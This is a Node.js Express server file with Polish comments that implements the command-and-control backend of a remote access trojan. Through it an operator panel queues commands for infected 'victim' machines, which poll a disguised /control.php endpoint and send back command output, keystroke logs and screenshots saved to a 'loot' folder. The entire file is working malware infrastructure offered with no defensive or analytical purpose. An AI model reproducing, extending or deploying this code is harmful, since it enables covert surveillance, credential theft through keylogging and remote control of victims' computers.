const express = require('express');
const cors = require('cors');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const COMMANDS_FILE = 'commands.txt';
const RESPONSES_FILE = 'responses.txt';
const KEYLOGS_FILE = 'keylogs.txt';
const LOOT_DIR = './loot';

if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

// Panel wysyła komendę
app.get('/send_cmd', (req, res) => {
    fs.writeFileSync(COMMANDS_FILE, req.query.cmd || '');
    res.send('OK');
});

// Panel odczytuje odpowiedzi
app.get('/get_responses', (req, res) => {
    if (fs.existsSync(RESPONSES_FILE)) res.send(fs.readFileSync(RESPONSES_FILE, 'utf8'));
    else res.send('Brak odpowiedzi.');
});

// Panel odczytuje keylogi
app.get('/get_keylogs', (req, res) => {
    if (fs.existsSync(KEYLOGS_FILE)) res.send(fs.readFileSync(KEYLOGS_FILE, 'utf8'));
    else res.send('Brak keylogow.');
});

// Klient (ofiara) odpytuje o komendy
app.get('/control.php', (req, res) => {
    try {
        let cmd = '';
        if (fs.existsSync(COMMANDS_FILE)) cmd = fs.readFileSync(COMMANDS_FILE, 'utf8').trim();
        if (cmd) {
            fs.writeFileSync(COMMANDS_FILE, '');
            res.json({ command: cmd });
        } else {
            res.json({ command: 'wait' });
        }
    } catch (e) {
        res.json({ command: 'wait' });
    }
});

// Klient wysyła odpowiedzi/keylogi/pliki
app.post('/control.php', (req, res) => {
    try {
        const data = req.body;
        if (data.keylog) {
            fs.appendFileSync(KEYLOGS_FILE, data.keylog);
        } else if (data.response) {
            fs.appendFileSync(RESPONSES_FILE, data.response + '\n---\n');
        } else if (data.screenshot) {
            const buf = Buffer.from(data.screenshot, 'base64');
            fs.writeFileSync(LOOT_DIR + '/screen_' + Date.now() + '.png', buf);
        }
        res.json({ status: 'ok' });
    } catch (e) {
        res.status(500).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Serwer dziala na porcie ' + PORT));